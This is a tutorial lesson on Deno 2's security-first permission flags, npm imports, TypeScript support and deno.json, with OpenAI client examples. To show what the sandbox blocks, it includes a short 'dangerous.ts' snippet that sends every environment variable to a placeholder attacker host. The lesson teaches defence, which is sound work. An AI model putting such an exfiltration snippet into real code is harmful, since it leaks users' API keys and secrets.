---
sidebar_position: 2
title: "Deno 2: Security-First Runtime"
description: "Master Deno 2's permission model, npm compatibility, and native TypeScript support. Learn when security-first development matters for AI applications."
keywords: ["Deno 2", "TypeScript runtime", "permission model", "npm compatibility", "security-first", "allow-net", "allow-read", "deno.json"]
chapter: 75
lesson: 2
duration_minutes: 20

# HIDDEN SKILLS METADATA
skills:
  - name: "Deno Permission Model Understanding"
    proficiency_level: "B1"
    category: "Technical"
    bloom_level: "Apply"
    digcomp_area: "Security"
    measurable_at_this_level: "Student can configure appropriate permissions for a Deno script using --allow-net, --allow-read, --allow-env flags"

  - name: "npm Package Integration in Deno"
    proficiency_level: "B1"
    category: "Technical"
    bloom_level: "Apply"
    digcomp_area: "Software Development"
    measurable_at_this_level: "Student can import npm packages using npm: specifier and configure import maps in deno.json"

  - name: "Runtime Selection Decision-Making"
    proficiency_level: "B1"
    category: "Applied"
    bloom_level: "Analyze"
    digcomp_area: "Technical Problem-Solving"
    measurable_at_this_level: "Student can evaluate when Deno's security model provides value over Node.js"

  - name: "Deno Configuration Management"
    proficiency_level: "A2"
    category: "Technical"
    bloom_level: "Understand"
    digcomp_area: "Software Development"
    measurable_at_this_level: "Student can create deno.json with tasks, imports, and permission configurations"

learning_objectives:
  - objective: "Configure Deno permissions using --allow-net, --allow-read, --allow-env, and --allow-write flags"
    proficiency_level: "B1"
    bloom_level: "Apply"
    assessment_method: "Student runs Deno scripts with correct minimal permissions for the task"

  - objective: "Import npm packages using the npm: specifier and configure import maps in deno.json"
    proficiency_level: "B1"
    bloom_level: "Apply"
    assessment_method: "Student creates a working Deno script using OpenAI npm package"

  - objective: "Evaluate when Deno's security-first approach benefits AI development workflows"
    proficiency_level: "B1"
    bloom_level: "Analyze"
    assessment_method: "Student articulates scenarios where Deno's permission model prevents security issues"

  - objective: "Create deno.json configuration with tasks, imports, and compiler options"
    proficiency_level: "A2"
    bloom_level: "Understand"
    assessment_method: "Student creates functional deno.json for an AI client project"

cognitive_load:
  new_concepts: 6
  assessment: "6 concepts (permission model, --allow-* flags, npm: specifier, deno.json, import maps, first-class TypeScript) within B1 limit of 7-10 concepts - PASS"

differentiation:
  extension_for_advanced: "Explore Deno's built-in formatter (deno fmt), linter (deno lint), and test runner (deno test). Compare Deno Deploy to Node.js on AWS Lambda."
  remedial_for_struggling: "Focus on the permission model first. Run deno run without any flags to see the permission errors, then add flags one by one to understand what each allows."

generated_by: content-implementer
source_spec: chapter-63-readme
created: 2026-01-01
last_modified: 2026-01-01
version: 1.0.0
---

# Deno 2: Security-First Runtime

Your AI scripts handle sensitive data. API keys. User information. Network requests to external services. What happens when you run an npm package that secretly reads your environment variables and sends them to a remote server? In Node.js, the answer is: it just works. The package has full access to everything your script can access.

Deno takes a different approach. Every script starts in a sandbox. No network access. No file system access. No environment variable access. You explicitly grant permissions for exactly what your code needs. This isn't paranoia—it's the principle of least privilege applied to JavaScript runtimes.

If you're building AI tools that run user-provided scripts, process sensitive documents, or integrate with third-party packages, Deno's permission model isn't a feature—it's a requirement.

## Why Deno Exists: The Node.js Security Gap

Ryan Dahl created Node.js in 2009. Ten years later, he gave a famous talk titled "10 Things I Regret About Node.js." His regrets included:

1. **No security model**: Any script can access your file system, network, and environment
2. **node_modules complexity**: The package resolution algorithm became unwieldy
3. **require() without extensions**: File extensions should be explicit
4. **TypeScript as an afterthought**: Type checking required external tools

Deno addresses all of these. It's not a Node.js replacement—it's a rethink of what a JavaScript runtime should be.

## The Permission Model: Security by Default

Run this script in Node.js, and it executes without question:

```typescript
// dangerous.ts - This would run freely in Node.js
const apiKeys = process.env;
await fetch("https://evil.example.com", {
  method: "POST",
  body: JSON.stringify(apiKeys),
});
```

Run the same script in Deno, and it fails immediately:

```bash
deno run dangerous.ts
```

**Output:**
```
error: Uncaught PermissionDenied: Requires env access to read environment variables.
```

Deno blocks both the environment variable access AND the network request. To make this script run, you'd need to explicitly grant both permissions:

```bash
deno run --allow-env --allow-net dangerous.ts
```

But why would you? The permission requirements make the danger visible.

## Core Permission Flags

Deno provides granular control over what your scripts can access:

| Flag | What It Allows | Granular Option |
|------|---------------|-----------------|
| `--allow-net` | Network access | `--allow-net=api.openai.com` |
| `--allow-read` | File system reads | `--allow-read=./data` |
| `--allow-write` | File system writes | `--allow-write=./output` |
| `--allow-env` | Environment variables | `--allow-env=OPENAI_API_KEY` |
| `--allow-run` | Execute subprocesses | `--allow-run=python` |
| `--allow-all` | Everything (use sparingly) | — |

Let's see this in practice with an AI client:

```typescript
// src/ai-client.ts
const apiKey = Deno.env.get("OPENAI_API_KEY");

const response = await fetch("https://api.openai.com/v1/chat/completions", {
  method: "POST",
  headers: {
    "Authorization": `Bearer ${apiKey}`,
    "Content-Type": "application/json",
  },
  body: JSON.stringify({
    model: "gpt-4",
    messages: [{ role: "user", content: "Hello!" }],
  }),
});

const data = await response.json();
console.log(data.choices[0].message.content);
```

Run with minimal permissions:

```bash
deno run --allow-env=OPENAI_API_KEY --allow-net=api.openai.com src/ai-client.ts
```

**Output:**
```
Hello! How can I assist you today?
```

This script can ONLY:
- Read the `OPENAI_API_KEY` environment variable (not others)
- Make network requests to `api.openai.com` (not other hosts)

If the OpenAI package tried to phone home to a tracking service, that request would fail. The permission model creates an auditable security boundary.

## npm Compatibility: Using Existing Packages

Deno 2 brought full npm compatibility. You can use npm packages without modification using the `npm:` specifier:

```typescript
// src/openai-client.ts
import OpenAI from "npm:openai";

const client = new OpenAI();

const response = await client.chat.completions.create({
  model: "gpt-4",
  messages: [{ role: "user", content: "Hello from Deno!" }],
});

console.log(response.choices[0].message.content);
```

Run it:

```bash
deno run --allow-env --allow-net src/openai-client.ts
```

**Output:**
```
Hello! How can I assist you today?
```

The `npm:openai` syntax tells Deno to download and cache the OpenAI package from npm. No `node_modules` folder. No `package.json` required. Deno handles dependencies automatically.

## First-Class TypeScript: No Configuration Required

Node.js 22 added experimental TypeScript support. Deno had it from day one—but with a key difference.

In Node.js, you need `--experimental-strip-types` and can't use all TypeScript features:

```bash
# Node.js
node --experimental-strip-types src/app.ts
```

In Deno, TypeScript just works:

```bash
# Deno - no flags needed
deno run src/app.ts
```

Type checking happens automatically. Strict mode is on by default. You write TypeScript, and it runs. No `tsconfig.json` required (though you can customize if needed).

```typescript
// src/typed-client.ts - Works immediately in Deno
interface ChatMessage {
  role: "user" | "assistant" | "system";
  content: string;
}

interface ChatResponse {
  id: string;
  choices: Array<{
    message: ChatMessage;
  }>;
}

async function chat(messages: ChatMessage[]): Promise<string> {
  const response = await fetch("https://api.openai.com/v1/chat/completions", {
    method: "POST",
    headers: {
      "Authorization": `Bearer ${Deno.env.get("OPENAI_API_KEY")}`,
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ model: "gpt-4", messages }),
  });

  const data: ChatResponse = await response.json();
  return data.choices[0].message.content;
}

const result = await chat([{ role: "user", content: "Say hello" }]);
console.log(result);
```

Run with type checking:

```bash
deno check src/typed-client.ts  # Type check only
deno run --allow-env --allow-net src/typed-client.ts  # Run (type checked automatically)
```

**Output:**
```
Hello!
```

## Project Configuration with deno.json

For larger projects, create a `deno.json` configuration file:

```json
{
  "tasks": {
    "start": "deno run --allow-net --allow-env src/main.ts",
    "dev": "deno run --watch --allow-net --allow-env src/main.ts",
    "check": "deno check src/**/*.ts",
    "test": "deno test --allow-net --allow-env"
  },
  "imports": {
    "openai": "npm:openai@^4.0.0",
    "@std/": "jsr:@std/"
  },
  "compilerOptions": {
    "strict": true
  }
}
```

This configuration provides:

**Tasks**: npm-script-like commands that bundle common operations:

```bash
deno task start  # Run the app
deno task dev    # Run with file watching
deno task check  # Type check
deno task test   # Run tests
```

**Import Maps**: Alias long package specifiers to short names:

```typescript
// Instead of: import OpenAI from "npm:openai@^4.0.0";
import OpenAI from "openai";

// Use Deno's standard library
import { join } from "@std/path";
```

**Compiler Options**: TypeScript configuration without a separate tsconfig.json.

## Deno vs Node.js: When to Choose Deno

| Use Case | Deno | Node.js |
|----------|------|---------|
| **Secure script execution** | Permission model prevents unauthorized access | Trust everything, use VM sandbox if needed |
| **Quick prototypes** | No package.json, no node_modules, just run | Requires setup boilerplate |
| **CI/CD scripts** | Single binary, minimal dependencies | Needs npm install step |
| **Running untrusted code** | Sandboxed by default | Requires complex isolation |
| **Production APIs** | Growing ecosystem | Largest ecosystem, most packages |
| **Enterprise support** | Deno Deploy, Deno for Enterprise | AWS, GCP, Azure native support |

**Choose Deno when:**
- You're building tools that run user-provided or third-party code
- You want TypeScript without configuration
- You need auditable security boundaries
- You're prototyping quickly and don't want node_modules overhead

**Choose Node.js when:**
- You need a specific npm package that doesn't work in Deno
- Your infrastructure is built around Node.js (Lambda, etc.)
- Your team is more familiar with Node.js patterns
- You need the absolute largest ecosystem

## A Complete Example: Secure AI Client

Let's build a complete Deno project structure for an AI client:

```
ai-client/
├── deno.json
├── src/
│   └── main.ts
└── .env
```

**deno.json:**
```json
{
  "tasks": {
    "start": "deno run --allow-net=api.openai.com --allow-env=OPENAI_API_KEY src/main.ts",
    "dev": "deno run --watch --allow-net=api.openai.com --allow-env=OPENAI_API_KEY src/main.ts"
  },
  "imports": {
    "openai": "npm:openai@^4.0.0"
  }
}
```

**src/main.ts:**
```typescript
import OpenAI from "openai";

async function main(): Promise<void> {
  const client = new OpenAI();

  console.log("Calling OpenAI API...\n");

  const response = await client.chat.completions.create({
    model: "gpt-4",
    messages: [
      { role: "system", content: "You are a helpful assistant." },
      { role: "user", content: "Explain Deno's permission model in one sentence." },
    ],
  });

  console.log("Response:");
  console.log(response.choices[0].message.content);
}

main().catch(console.error);
```

**.env:**
```
OPENAI_API_KEY=sk-your-key-here
```

Run it:

```bash
# Load .env and run
export $(cat .env | xargs) && deno task start
```

**Output:**
```
Calling OpenAI API...

Response:
Deno's permission model requires explicit flags to grant scripts access to the network, file system, and environment variables, ensuring security by default.
```

Notice the permission specificity in the task:
- Only `api.openai.com` can be accessed
- Only `OPENAI_API_KEY` environment variable is readable

If this script were compromised and tried to exfiltrate data, it would fail.

## Security in Practice: The Supply Chain Problem

In 2021, a popular npm package `ua-parser-js` (7 million weekly downloads) was compromised to steal credentials. Node.js users who ran `npm install` unknowingly pulled malicious code that had full system access.

In Deno, that attack fails at multiple levels:

1. **No automatic code execution**: Deno doesn't run postinstall scripts
2. **Permission denial**: Malicious network requests would require `--allow-net`
3. **Explicit imports**: You see exactly what packages you're importing

This doesn't make Deno immune to supply chain attacks—but it makes attacks harder and more visible.

## Try With AI

### Prompt 1: Permission Exploration

```
I want to understand Deno's permission model hands-on. Create a simple script that:
1. Reads a file from disk
2. Makes a network request
3. Reads an environment variable

First, show me what happens when I run it with no permissions.
Then show me the minimum permissions needed.
Finally, show me overly broad permissions and explain why they're bad.
```

**What you're learning:** The principle of least privilege in practice—understanding why minimal permissions matter for security-sensitive AI applications.

### Prompt 2: Migration from Node.js

```
I have a Node.js script that uses axios to call an API:

const axios = require('axios');
const response = await axios.get('https://api.example.com/data');
console.log(response.data);

Convert this to Deno using:
1. The fetch API (built-in)
2. Proper TypeScript types
3. Appropriate permission flags

What changes between Node.js and Deno patterns?
```

**What you're learning:** The practical differences between Node.js and Deno—understanding that most code translates directly, with key changes in how imports and permissions work.

### Prompt 3: Security Audit

```
I'm building a Deno script that will:
- Read API keys from environment variables
- Call multiple AI provider APIs (OpenAI, Anthropic, Google)
- Write responses to a log file

Help me design the permission structure:
1. What's the minimum permission set I need?
2. How do I scope network access to only the APIs I'm using?
3. What risks remain even with proper permissions?

Show me the deno.json configuration and explain each permission choice.
```

**What you're learning:** Security architecture for AI applications—thinking through what access your code actually needs and limiting exposure to the minimum.

---

**Safety note**: Even with Deno's permission model, be cautious with `--allow-all`. It exists for convenience during development, but production scripts should always use minimal, explicit permissions. When you see a script requiring `--allow-all`, ask why—it often indicates either laziness or legitimate complexity that deserves documentation.
